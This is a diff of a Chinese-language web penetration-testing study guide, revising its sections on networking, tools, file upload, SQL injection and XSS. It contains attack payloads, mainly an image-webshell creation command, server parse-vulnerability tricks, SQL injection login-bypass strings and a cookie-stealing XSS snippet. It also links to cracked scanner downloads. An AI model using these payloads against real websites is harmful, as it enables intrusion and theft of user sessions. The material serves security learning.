@@ -11,26 +11,22 @@
   - [网络基础](#网络基础)
     - [术语](#术语)
       - [OSI七层协议](#osi七层协议)
-      - [UDP](#udp)
-      - [TCP](#tcp)
+      - [UDP与TCP](#udp与tcp)
+      - [三次握手与四次挥手](#三次握手与四次挥手)
       - [DHCP协议](#dhcp协议)
       - [路由算法](#路由算法)
     - [DNS](#dns)
       - [邮件协议族](#邮件协议族)
       - [邮件安全协议](#邮件安全协议)
     - [HTTP/HTTPS基础知识](#httphttps基础知识)
-      - [源码与展示](#源码与展示)
+      - [静态与动态](#静态与动态)
         - [cookie含义](#cookie含义)
       - [访问类型](#访问类型)
       - [状态码](#状态码)
     - [代理](#代理)
     - [编程语言](#编程语言)
-      - [PYTHON](#python)
-        - [常用](#常用)
-      - [JAVASCRIPT](#javascript)
-      - [JAVA](#java)
-      - [PHP](#php)
-      - [MVC](#mvc)
+      - [思想](#思想)
+        - [MVC](#mvc)
     - [Web容器分类](#web容器分类)
     - [数据库](#数据库)
       - [关系型](#关系型)
@@ -48,6 +44,7 @@
     - [windows](#windows)
       - [windows 常见命令](#windows-常见命令)
       - [powshell](#powshell)
+  - [常见文件含义](#常见文件含义)
 - [信息收集](#信息收集)
   - [信息搜集开源项目](#信息搜集开源项目)
   - [web组成框架信息收集](#web组成框架信息收集)
@@ -108,11 +105,11 @@
       - [Wireshark](#wireshark)
       - [Burpsuite](#burpsuite)
     - [通用漏洞扫描工具](#通用漏洞扫描工具)
-      - [Awvs](#awvs)
-      - [AppScan](#appscan)
+      - [网站扫描](#网站扫描)
     - [kali](#kali)
       - [安装kali](#安装kali)
     - [网站](#网站)
+    - [其他常见工具](#其他常见工具)
 - [web安全](#web安全)
   - [中间人攻击](#中间人攻击)
   - [反序列化（对象注入）](#反序列化对象注入)
@@ -126,6 +123,7 @@
   - [html 注入](#html-注入)
   - [下载漏洞](#下载漏洞)
   - [文件操作](#文件操作)
+    - [文件读取](#文件读取)
     - [文件包含](#文件包含)
       - [本地文件包含](#本地文件包含)
       - [远程协议包含](#远程协议包含)
@@ -203,7 +201,6 @@
     - [文件读取与写入](#文件读取与写入)
     - [SQL注入常见防御](#sql注入常见防御)
     - [绕过防御](#绕过防御)
-      - [IP白名单](#ip白名单)
       - [静态资源](#静态资源)
       - [爬虫白名单](#爬虫白名单)
       - [版本绕过](#版本绕过)
@@ -227,33 +224,26 @@
       - [反射型](#反射型)
       - [持久型](#持久型)
       - [DOM型](#dom型)
-    - [待补充：fuzz](#待补充fuzz)
-    - [XSStrike](#xsstrike)
-    - [xss平台](#xss平台)
-      - [使用](#使用)
-    - [XSS其他工具推荐](#xss其他工具推荐)
-    - [beef-xss](#beef-xss)
-    - [self-xss](#self-xss)
+    - [工具](#工具-3)
+      - [XSStrike](#xsstrike)
+      - [xss平台](#xss平台)
+      - [beef-xss](#beef-xss)
     - [防御与绕过](#防御与绕过)
       - [httponly](#httponly)
-      - [常见防御](#常见防御)
       - [常见绕过](#常见绕过)
-    - [XSS注入过程](#xss注入过程)
   - [CSRF](#csrf)
     - [实战](#实战)
     - [防御](#防御-3)
   - [SSRF](#ssrf)
     - [常见攻击演示](#常见攻击演示)
       - [图片上传](#图片上传)
-  - [接口乱用](#接口乱用)
-    - [短信轰炸](#短信轰炸)
   - [DDOS 攻击](#ddos-攻击)
     - [攻击过程](#攻击过程)
       - [DDOS 攻击手段](#ddos-攻击手段)
 - [经验积累](#经验积累)
   - [CMS特性](#cms特性)
     - [敏感信息搜集](#敏感信息搜集)
-    - [工具](#工具-3)
+    - [工具](#工具-4)
       - [利用](#利用)
       - [弱口令](#弱口令)
     - [thinkphp5](#thinkphp5)
@@ -263,7 +253,7 @@
       - [基本信息](#基本信息)
       - [敏感信息](#敏感信息)
   - [语言特性](#语言特性)
-    - [PHP](#php-1)
+    - [PHP](#php)
       - [变量覆盖漏洞](#变量覆盖漏洞)
     - [JAVAWEB](#javaweb)
       - [与SQL注入有关的预编译](#与sql注入有关的预编译)
@@ -274,7 +264,7 @@
         - [阿里云盾](#阿里云盾)
         - [宝塔](#宝塔)
         - [安全狗](#安全狗)
-        - [人工智能WAF](#人工智能waf)
+        - [将会流行的WAF](#将会流行的waf)
       - [市面上常见绕过工具](#市面上常见绕过工具)
     - [通用](#通用)
       - [待补充：全扫描工具](#待补充全扫描工具)
@@ -290,10 +280,10 @@
     - [xss 绕过](#xss-绕过)
     - [权限控制拦截](#权限控制拦截)
     - [其他绕过总结](#其他绕过总结)
+  - [蜜罐](#蜜罐)
   - [木马](#木马)
-  - [密码](#密码)
 - [系统漏洞](#系统漏洞)
-  - [工具](#工具-4)
+  - [工具](#工具-5)
     - [探测工具简介](#探测工具简介)
     - [EXP工具](#exp工具)
         - [Metasploit](#metasploit)
@@ -311,6 +301,8 @@
     - [定向社工](#定向社工)
   - [如何在本地查询](#如何在本地查询)
 - [经验](#经验-1)
+  - [IP伪造](#ip伪造)
+  - [界面](#界面)
   - [EXP](#exp)
     - [攻破类似网站](#攻破类似网站)
       - [如何攻击更多人](#如何攻击更多人)
@@ -391,17 +383,19 @@
     - [基础开发知识](#基础开发知识)
     - [审计](#审计)
       - [手动](#手动-1)
-      - [工具](#工具-5)
+      - [工具](#工具-6)
 - [隐藏技术](#隐藏技术)
   - [实用工具](#实用工具)
     - [匿名工具](#匿名工具)
-    - [蜜罐](#蜜罐)
     - [日志删除](#日志删除)
 - [下一步](#下一步)
+  - [找工作](#找工作)
   - [自学](#自学)
     - [文档](#文档)
     - [视频](#视频)
   - [如何赚钱](#如何赚钱)
+    - [靠技术](#靠技术)
+    - [技术沾边](#技术沾边)
   - [刷题](#刷题)
   - [工具社区](#工具社区)
   - [知名机构](#知名机构)
@@ -410,11 +404,12 @@
   - [期刊](#期刊)
   - [大会](#大会)
   - [导航](#导航)
-  - [大佬博客](#大佬博客)
-  - [提交漏洞](#提交漏洞)
-    - [教育行业平台](#教育行业平台)
+  - [游戏](#游戏)
+    - [红蓝对抗](#红蓝对抗)
     - [SRC](#src)
-  - [待整理：图书推荐](#待整理图书推荐)
+  - [图书推荐](#图书推荐)
+    - [基础](#基础)
+    - [中级](#中级)
   - [博客](#博客)
   - [如何修成](#如何修成)
       - [成为什么样的人](#成为什么样的人)
@@ -434,15 +429,11 @@
 预计2022年完成
 
 
-很抱歉，这篇文章你看到的时候还是粗糙的，文章更改可能出现在各个章节，文章每天都在更新，不定期发布更新版本。
-
-
-
-在github显示效果似乎不是很好，可以下载typora与md文件，将md用typora打开，可以看到目录树。记得同步我的最新文章
+很抱歉，这篇文章你看到的时候还是粗糙的，文章更改可能出现在各个章节，文章**约一周发布2次左右更新版本。**
+在github显示效果似乎不是很好，可以下载typora与md文件，将md用typora打开，可以看到目录树。记得同步我的最新文章。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720144245627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 食用这篇文章的最好方法就是每次有新收获去在指定章节完善它。所以如果你有热情跟我一起进步，有责任心自始至终的完成这篇文章，那么请加群联系我吧。
-
 
 # 常见知识点
 
@@ -458,7 +449,9 @@
 对于网站常用base64对url中id进行加密
 对于数据库密码常用md5加密
 
-
+**对称加密与非对称**
+对称加密是最快速、最简单的一种加密方式，加密与解密用的是同样的密钥。常见的对称加密算法：DES，AES等。
+非对称加密为数据的加密与解密提供了一个非常安全的方法，它使用了一对密钥，公钥和私钥。私钥只能由一方安全保管，不能外泄，而公钥则可以发给任何请求它的人。非对称加密使用这对密钥中的一个进行加密，而解密则需要另一个密钥。最常用的非对称加密算法：RSA
 #### 分辨是什么类型的
 
 互联网只接受 ASCII 格式的 URL，URL 编码需要对 URL 字符集的某些部分进行编码。此过程将一个字符转换为一个字符三元组，其前缀为“%”，后跟两个十六进制格式的数字。
@@ -513,7 +506,7 @@ ftp的端口号20、21的区别前者是数据端口，后者是控制端口
 
 
 **22**
-SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。
+SSH 是协议。SSH 为 Secure Shell 的缩写，专为远程登录会话和其它网络服务提供安全性的协议。
 
 
 **23 Telnet**
@@ -551,7 +544,7 @@ NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系
 
 
 **4899端口**
-是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。
+是remote administrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。
 
 
 **5631端口渗透剖析**
@@ -616,7 +609,7 @@ Redis:6379
 **应用层**
 传输对象：各种应用如电子邮件、文件传输等
 
-#### UDP
+#### UDP与TCP
 
 协议开销小、效率高。
 UDP是无连接的，即发送数据之前不需要建立连接。
@@ -625,32 +618,38 @@ UDP没有拥塞控制。
 UDP支持一对一、一对多、多对一和多对多交互通信。
 UDP的首部开销小，只有8个字节。
 
-#### TCP
+TCP是一种面向连接的单播协议，在发送数据前，通信双方必须在彼此间建立一条连接。所谓的“连接”，其实是客户端和服务器的内存里保存的一份关于对方的信息，如ip地址、端口号等。
 
-三次握手（Three-Way Handshake）是指建立一个TCP连接时，需要客户端和服务端总共发送3个包以确认连接的建立。
+TCP可以看成是一种字节流，它会处理IP层或以下的层的丢包、重复以及错误问题。在连接的建立过程中，双方需要交换一些连接的参数。这些参数可以放在TCP头部。
 
-第一次握手客户端将标志位 SYN 置为1，随机产生一个值 seq=s ，并将该数据包发送给服务端，客户端进入 SYN_SENT 状态，等待服务端确认。
+TCP提供了一种可靠、面向连接、字节流、传输层的服务，采用三次握手建立一个连接。采用4次挥手来关闭一个连接。
 
-第二次握手服务端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务端将标志位 SYN 置为1，ack=s+1，随机产生一个值 seq=k ，并将该数据包发送给客户端以确认连接请求，服务端进入 SYN_RCVD 状态。
+#### 三次握手与四次挥手
+ACK报文是用来应答的，SYN报文是用来同步的
+****
+当连接建立时，有：
 
-第三次握手客户端收到确认后，检查ack值是否为s+1，ACK标志位是否为1，如果正确则将标志位 ACK 置为1，ack=k+1，并将该数据包发送给服务端，服务端检查ack值是否为k+1，ACK标志位是否为1，如果正确则连接建立成功，客户端和服务端进入 ESTABLISHED 状态，完成三次握手
+客户端 ------SYN----> 服务器
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210611223014983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+客户端 <---ACK+SYN---- 服务器
 
+客户端 ------ACK----> 服务器
+****
 
-四次挥手（Four-Way Wavehand）指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。
+当终止到来时，有：
 
-第一次挥手客户端发送一个 FIN ，用来关闭客户端到服务端的数据传送，客户端进入 FIN_WAIT_1 状态。
+客户端------FIN---->服务器
 
-第二次挥手服务端收到 FIN 后，发送一个 ACK 给客户端，确认序号为收到序号+1，服务端进入 CLOSE_WAIT 状态。
+客户端 <-----ACK------ 服务器 
 
-第三次挥手服务端发送一个 FIN ，用来关闭服务端到客户端的数据传送，服务端进入 LAST_ACK 状态。
+客户端 <-----FIN------ 服务器 
 
-第四次挥手客户端收到 FIN 后，客户端进入 TIME_WAIT 状态，接着发送一个 ACK 给服务端，确认序号为收到序号+1，服务端进入 CLOSED 状态，完成四次挥手。
+客户端 ------ACK----> 服务器
 
 #### 	DHCP协议
 
 动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/cbb0a34b02bf4711919c5b4da792d23b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 #### 路由算法
 
@@ -740,13 +739,17 @@ https://en.wikipedia.org/wiki/DMARC#Alignment
 
 ### HTTP/HTTPS基础知识
 
-#### 源码与展示
+
+#### 静态与动态
+
+静态网页：最常用的格式文件就是html格式文件，大部分网页的格式都是html格式，html格式又包含有.htm、dhtml.xhtml.shtm.shtml。这些都是指静态页面，里面不含有动态程序。
+
+动态网页：页面级包括有ASP（基于JavaScript 或VbScript或C#）、JSP、PHP、ASPX、jspx、cgi。这些里面是包含服务器端执行的代码，也就是服务器在将这些网页发给客户端之前，会先执行里面的动态程序语言，并把执行后生成的html发送到客户端来的，所以我们在客户端看到的源代码也是html格式的。
 
 index.php（做个例子实际下index没太大意义）和网页展示的php通常不会是一样文件(网页只有js或html源码和F12结果是一样的，这可以用来判断一些网站是做前端验证还是服务器验证)，前者源码包含的文件更多，后者是解析后的文件。
 
 ##### cookie含义
 
-expires:当 Expires 属性缺省时，表示是会话性 Cookie，在用户关闭浏览器时失效。
 httponly：限制Cookie仅在HTTP传输过程中被读取，一定程度上防御XSS攻击。
 
 #### 访问类型
@@ -779,36 +782,17 @@ HTTPS多了SSL层，但一般而言这对于黑客而言于事无补。因为我
 
 
 ### 编程语言
-#### PYTHON
+初学者对于常用的网站开发语言你应该至少看一遍基础教程，且至少掌握一门语言，便于后续写脚本用。
+ **python**
 如果你没有任何编程基础，可以首先学一下python。因为语法简单，网上公开资料多。
-高级编程可以去看《流畅的python》
-##### 常用
-安装：pip
-
-提升安装速度：改镜像源
-
-提升代码运行速度：多线程、进程
-
-网络命令：socket、request
-
-打包成可执行文件：pyinstaller
-
-
-#### JAVASCRIPT
-
-js里面放前端函数
-
-
-#### JAVA
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718155518374.png)
-
+**JAVASCRIPT**
+**JAVA**
 安卓一般用java开发，安卓apk通过反编译就可以得到java文件，所以明白java特性对安卓漏洞也有好处。
-
-
-#### PHP
-
-#### MVC
+**PHP**
+基础自学网站 https://www.runoob.com/php/php-tutorial.html
+**ASP**
+#### 思想
+##### MVC
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717183445298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
@@ -838,7 +822,7 @@ tomcat
 一般配套数据库
 asp,access
 aspx,sqlserver
-php,mysql：中型网站常见使用方案
+php,mysql：中小型网站常见使用方案
 jsp,sqlserver+oracle
 python,mongodb,mysql...
 
@@ -1008,6 +992,16 @@ bunzip2 NB.*
 #### powshell
 现在一些提权项目不满足于仅限cmd的执行了，通常需要powershell，你可以在你打开cmd后输入powershell。如下图打开了powershell
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071823320195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+## 常见文件含义
+**.htaccess**
+限制用户访问一些关键目录，如普通用户数据库目录会爆403，404页面与标配不一样等，就是因为配置了此文件。常见的写法如下：
+```bash
+<Files  ~ "^.*.([Ll][Oo][Gg])|([eE][xX][eE])">
+ Order allow,deny
+ Deny from all
+</Files>
+```
+更多阅读，apache的.htaccess文件作用和相关浅析 https://www.jianshu.com/p/81305ca91ebd
 # 信息收集
 
 如果你是攻击中小型网站，你信息搜集第一步是获取网站全貌，在着重点于收集网站第三方或源码，这会加快你的渗透速度。
@@ -1016,14 +1010,8 @@ bunzip2 NB.*
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520155239679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-
->
-
-
 ## 信息搜集开源项目
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630204515852.png)
-
+https://github.com/bit4woo/teemo
 
 
 
@@ -1322,8 +1310,13 @@ filename=../../../etc/passwd
 
 ### 虚拟机配置上网
 
+桥接（Bridged）：VMnet0连接，类似与一个网络环境下的两台电脑
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515003648812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+ 网络地址转化（Network Address Translation）：Vmnet8连接，类似孕妇，虚拟机通过主机上网
+ 
+  主机网络（Host-Only）：Vmnet1连接，虚拟机只能和主机通信不能上网。
+
+
 
 
 
@@ -1982,15 +1975,16 @@ Intruder是一个高度可配置工具，可以对web自动化攻击，模糊测
 ### 通用漏洞扫描工具
 
 
-#### Awvs
+#### 网站扫描
+AWVS较为轻量，扫描快。APPscan大但全，一般为发现网站漏洞会结合使用
+**Awvs**
 
 注意:登录类网站扫描要带cookies扫才能扫到
-awvs_13.0.2009 web漏洞扫描器 安装教程,附下载破解包下载链接
+awvs_13.0.2009 web漏洞扫描器 安装教程,附下载破解包下载链接，具体看https://blog.csdn.net/weixin_41924764/article/details/109549947
 
-#### AppScan
+**AppScan**
 
-一个Web漏洞扫描程序，主要适用于Windows系统。 https://blog.csdn.net/weixin_41924764/article/details/109549947
-
+10.0.2安装破解 https://www.cnblogs.com/azhyueqin/p/14336807.html
 
 
 
@@ -2036,10 +2030,12 @@ docker run -i -t 53e9507d8515 /bin/bash
 **reg007/0xreg**。可以查看目标用户使用这个邮箱还注册了哪些网站
 
 **nslookup**  查询IP
-[站长之家-在线nslookup执行，当然你也可以在kali直接利用或者将工具下载下来,这三种方式的查询结果都一样！](http://tool.chinaz.com/nslookup/)如果有幸拿到真实IP后，就可以对该IP的端口信息(开放端口和服务漏洞)、指纹信息（中间件版本，历史漏洞）、历史解析域名和域名的历史解析IP（拓展出更多资产）做进一步的探测。
+[站长之家-在线nslookup执行，当然你也可以在kali直接利用或者将工具下载下来,这三种方式的查询结果都一样！](http://tool.chinaz.com/nslookup/)
 
 
-
+### 其他常见工具
+xshell，免费正版下载，官网 https://www.netsarang.com/en/free-for-home-school/
+phpstudy https://www.xp.cn/download.html
 # web安全
 
 你应该根据网站的类型去鉴定最可能存在的漏洞是什么，比如社交最可能存在XSS、文件操作最可能存在包含上传或下载漏洞。根据你的猜想首先去测试最可能的网站的漏洞
@@ -2163,7 +2159,7 @@ ysoserial 工具会帮助你实现序列化，然后对方程序再调用反序�
 如果上传文件为 tar / tar.gz 类型，可以尝试构压缩包内文件名为../../../../xxx 的tar包
 文件导出
 如果是CSV 或者 Excel可以注意一下CSV注入
-
+### 文件读取
 ### 文件包含
 
 将文件包含进去，调用指定文件的代码.这种漏洞也很好被确定，一般url包含形如file=1.txt的参数就可以疑似了。在进一步直接访问url/1.txt，如果返回的界面与带参数file=1.txt一样那么你就可以确认这是文件包含了 
@@ -2319,22 +2315,21 @@ Filename：文件名，可以更改
 
 ##### +解析漏洞
 
-解析漏洞存在的条件是比较苛刻的，他要求是nginx、apache等服务器；*具体待补充*
+解析漏洞存在的条件是比较苛刻的
+
+> IIS 6.0 /xx.asp/xx.jpg "xx.asp"是文件夹名
+  IIS 7.0/7.5 默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析
+  Nginx 版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。 空字节代码 xxx.jpg%00.php
+  Apache （1）上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀 （2）lighttpd （3）xx.jpg/xx.php
+
 图片马制作很简单，你可以轻松的上传它，但是如何执行起来就是另一项技术。
 生成在同级文件下放入一句话木马和图，将其在win的cmd下输入
 
 ```bash
 copy 1.jpg /b+1.php/a 1.jpg
 ```
+如果有解析漏洞，图像中代码就会被执行
 
-和在一起后上传图片。
-或者
-你右击打开图片用编辑器编辑它，在尾巴后面加上php代码`<?php phpinfo();?>`
-
-当上传成功图片后会正确显示，如果对方存在解析漏洞，在图片的地址后加上/1.php就会导致图片被执行成脚本，图片的尾巴代码就会被执行出
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708212810712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-判断一个网站有没有解析漏洞只需要访问其jpg文件，在加上`/.php`看返回结果就知道了.如果返回的是404就证明没有漏洞，如果是乱码就证明有漏洞
 
 ##### +文件包含漏洞
 
@@ -2701,10 +2696,8 @@ hydra爆破工具，在kali有集成。在kali上有个默认密码字典位于`
 会话固定、XSS、缓存病毒攻击、日志伪造
 
 ## 宽字节注入
+只要发现使用gbk，韩文、日文等编码时就可以考虑可能存在宽字节注入漏洞。
 
-远古网站还有此漏洞
-
-宽字节注入时利用mysql的一个特性，使用GBxxx编码的时候，会认为两个字符是一个汉字
 在%df遇到%5c时，由于%df的ascii大于128，所以会自动拼接%5c，吃掉反斜线。而%27 %20小于ascii(128)的字符就会保留。通常都会用反斜线来转义恶意字符串，但是如果被吃掉后，转义失败，恶意的xss代码可以继续运行。
 反斜杠的GBxxx编码为%5C，根据GBxxx编码在前面加上%DE，%DF，%E0。。。都可以组成一个汉字，从而把反斜杠这个转义字符给吃了
 %27---------单引号
@@ -2978,8 +2971,6 @@ WHERE   UserID = '1' AND ASCII(SUBSTRING(username,1,1)) = 97 AND '1' = '1'
 让我们分解一下。内部函数总是先执行，所以 SUBSTRING() 取用户名字符串的第一个字符并将长度限制为 1；这样，我们可以一次遍历每个字符，直到到达字符串的末尾。
 
 接下来，ASCII() 函数以我们刚获得的字符作为参数运行。语句的其余部分基本上只是一个条件：如果这个字符的 ASCII 值等于 97（即“a”），并且 1=1 为真（它总是如此），那么整个语句是真的，我们有正确的性格。如果返回 false，那么我们可以将 ASCII 值从 97 增加到 98，并重复该过程直到它返回 true。
-通过在终端中输入man ascii可以访问一个方便的 ASCII 表：
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603174843546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 例如，如果我们知道用户名是“jsmith”，那么在达到 106（即“j”的 ASCII 值）之前，我们不会看到返回 true。一旦我们获得了用户名的第一个字符，我们就可以通过重复此过程并将 SUBSTRING() 的起始位置设置为 2 来继续下一个字符
 **结束程序**
@@ -3061,7 +3052,6 @@ asp aspx万能密码
 Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
 Password=1
 
-17..admin' or 'a'='a 密码随便
 
 
 PHP万能密码
@@ -3120,8 +3110,7 @@ select * from user where username='reborn'='' and password='reborn'=''
 >利用URL对制表符的转义将空格替代为%09
 >
 >sql注入常常在URL地址栏、登陆界面、留言板、搜索框等。这往往给骇客留下了可乘之机。轻则数据遭到泄露，重则服务器被拿下。。攻击者甚至能够完成远程命令执行。这是最常见的一个话题了，网上有很多帮助初学者的且全的小白文章[这篇还行](https://www.anquanke.com/post/id/235970)
->![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050719180262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
+>
 
 
 **SQL注入步骤**
@@ -3276,15 +3265,7 @@ NULL
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705211048981.png)
 
-#### IP白名单
 
-通过对网站ip地址的伪造，知道对方网站ip地址，那就默认为ip地址为白名单。
-从网络层获取的ip，这种一般伪造不来，因为：1.你需要获取白名单ip 2.ip判定是从请求数据包进行判定的，这样就有可能存在伪造ip绕过的情况。
-测试方法：修改http的header来by pass waf
-X-forwarded-for
-X-remote-IP
-X-remote-addr
-X-Real-IP
 
 #### 静态资源
 
@@ -3523,30 +3504,23 @@ cookie注入 后接cookie值
 
 ## xss攻击
 
-xss攻击执行的是javascript脚本，javascript脚本能执行多强就意味着xss能达到什么样的攻击。只要有数据交互的，数据展示的地方就有可能存在xss攻击。比如对你的用户名展示，对你输入的东西展示。比如留言，网站callback等
+xss攻击执行的是javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强就意味着xss能达到什么样的攻击。只要有数据交互的，数据展示的地方就有可能存在xss攻击比如对你的用户名展示，对你输入的东西展示。比如留言，网站callback等
 
-Cookie 窃取XSS 。诱导用户去点击你含有cookie切入的链接，比如你可以将自己用户名改`<script>alert(document.cookie)</script>`  向用户去求分享链接，比如百度网盘之前一漏洞：有人用户名为此，当别人给他账号分享文件时，就会弹出此用户的cookie。
+
 虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址
 cookie还要有意义，如果对方是未登录状态的cookie就索然无味了。一般这种攻击要么就是在肯定对方大概率会查看你的页面时要么就是定向。
 
 
-**常见问题：cookie获取到了缺登录不上？**
+**常见问题：cookie获取到了却登录不上？**
 区别两个术语
 cookie 储存本地 存活时间较长 小中型
 session 会话 存储服务器 存活时间较短  大型。session就像比如你登录了一次支付宝，过了几分钟不用就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。
 对方网站如果只认cookie验证，那么你盗取session是没什么价值的。反过来只认session你盗取cookie做验证也是没有价值的
-**常见问题：这个地方是因为有什么防护机制我的xss没有执行？**
-查看输入浏览器的位置就可以知道
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710170454262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 **常见问题：cookie是空？**
-这种一般是http-only打开了
+http-only打开了或没登录
 
-****
 
-**技巧：利用cookie的工具**
-你盗取到的cookie可以直接用postman进行访问
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710115739542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 **技巧：从phpinfo返回信息获得管理权限**
 phpinfo展示界面中拥有cookie值，你获取到这个之后可以访问网站，进行xss操作，如获取源码等
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710150205547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -3595,34 +3569,8 @@ if(hash){
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520190651246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-
-
-
-
-
-强制下载文件
-重定向用户
-其他脚本以启用键盘记录器，拍照等
-网络钓鱼、窃取用户Cookies、弹广告刷流量、具备改页面信息、删除文章、获取客户端信息、传播蠕虫
-
-
-csp没如何绕过，dom型xss和反射型xss区别，xss获取cookie如何绕过http-only等一些。
-
-xss漏洞原理分析与挖掘方法 - 知乎
-web漏洞 | XSS（跨站攻击脚本）详解
-XSS汇总
-XSS小结 - 先知社区
-2020跨站点脚本[xss]速查表|雨苁
-XSSer自动化工具
-XSStrike 自动化绕过WAF
-xss payload字典 burp爆破　
-客服对话系统上XSS打cookie
-搭建XSS平台 3s.wf/
-http://xssor.io
-
-### 待补充：fuzz
-
-### XSStrike
+### 工具
+#### XSStrike
 
 https://github.com/s0md3v/XSStrike
 外国人的项目，自带识别并绕过WAF(由于是外国开发的项目，可能对于中国的一些WAF识别不是很好，但是它的测试仍旧是走对的)所以 如果用在国内的项目探测出WAF：offline不要确定没有WAF。
@@ -3636,30 +3584,21 @@ https://github.com/s0md3v/XSStrike
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717001905875.png)
 
 
-### xss平台
+#### xss平台
 
 如果你搞的东西比较敏感，不希望别人知道也可以自己搭建一个。目前国内几款xss平台使用规则都差不多，通常总有延迟等问题，不是很好用
 自己写类似于如下，一个文件用于触发，另一个文件用于接收。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710003925868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710004151205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-#### 使用
+
 
 以下为链接为  https://xsshs.cn 的平台，其他XSS平台使用类似
